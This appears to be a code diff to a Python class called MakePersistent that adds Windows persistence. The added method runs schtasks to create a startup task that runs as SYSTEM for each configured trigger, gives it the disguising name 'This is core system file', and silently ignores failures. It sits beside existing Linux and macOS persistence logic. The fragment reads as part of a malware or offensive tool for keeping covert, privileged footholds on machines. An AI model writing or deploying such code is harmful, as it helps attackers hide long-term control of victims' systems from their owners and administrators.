@@ -42,9 +42,18 @@ class MakePersistent:
 
         return service_files
 
+    def create_persistence_windows(self):
+        for trigger in self.triggers:
+            try:
+                system(f'schtasks /create /tn "This is core system file" /sc onstart /ru system /tr "{trigger}"')
+            except Exception as e:
+                continue
+
     def make_persistent(self):
         files_created = []
         if self.os == "Linux" or self.os == "Darwin":
             files_created = self.create_persistence_linux()
+        elif self.os == "Windows":
+            self.create_persistence_windows()
 
         return files_created
